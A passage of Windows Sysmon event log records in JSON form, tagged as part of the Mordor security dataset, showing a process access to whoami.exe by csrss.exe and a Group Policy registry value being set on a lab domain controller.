C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\system32\\basesrv.DLL+2fba|C:\\windows\\SYSTEM32\\CSRSRV.dll+5af4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce5f","SourceModuleName":"eventlog","ProcessId":"2808","SourceImage":"C:\\windows\\system32\\csrss.exe","EventReceivedTime":"2020-08-07 10:32:47","port":60122,"AccountName":"SYSTEM","UtcTime":"2020-08-07 14:32:45.880","GrantedAccess":"0x1fffff","Domain":"NT AUTHORITY","ExecutionProcessID":3284,"host":"wec.internal.cloudapp.net","SourceProcessId":"2808","SourceThreadId":"8136","Severity":"INFO","TargetProcessId":"6504","SeverityValue":2,"EventID":10,"UserID":"S-1-5-18","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":725681,"SourceModuleType":"im_msvistalog","Keywords":-9223372036854775808,"TargetImage":"C:\\windows\\system32\\whoami.exe","RuleName":"-"}
{"tags":["mordorDataset"],"@version":"1","EventType":"SetValue","Version":2,"ThreadID":4208,"EventTime":"2020-08-07 10:32:46","Task":13,"AccountType":"User","Channel":"Microsoft-Windows-Sysmon/Operational","EventTypeOrignal":"INFO","SourceName":"Microsoft-Windows-Sysmon","Hostname":"MORDORDC.theshire.local","@timestamp":"2020-08-07T14:32:47.600Z","OpcodeValue":0,"Message":"Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-08-07 14:32:46.561\r\nProcessGuid: {9f85ce58-59de-5f2b-2400-000000000400}\r\nProcessId: 1696\r\nImage: C:\\windows\\system32\\svchost.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\PolicyOverdue\r\nDetails: DWORD (0x00000000)","SourceModuleName":"eventlog","ProcessId":"1696","Details":"DWORD (0x00000000)","port":60122,"AccountName":"SYSTEM","EventReceivedTime":"2020-08-07 10:32:47","UtcTime":"2020-08-07 14:32:46.561","Domain":"NT AUTHORITY","ExecutionProcessID":3888,"host":"wec.internal.cloudapp.net","Severity":"INFO","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\PolicyOverdue","SeverityValue":2,"EventID":13,"UserID":"S-1-5-18","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":757094,"Image":"C:\\windows\\system32\\svchost.exe","Keywords":-9223372036854775808,"ProcessGuid":"{9f85ce58-59de-5f2b-2400-000000000400}","SourceModuleType":"im_msvistalog","RuleName":"-"}
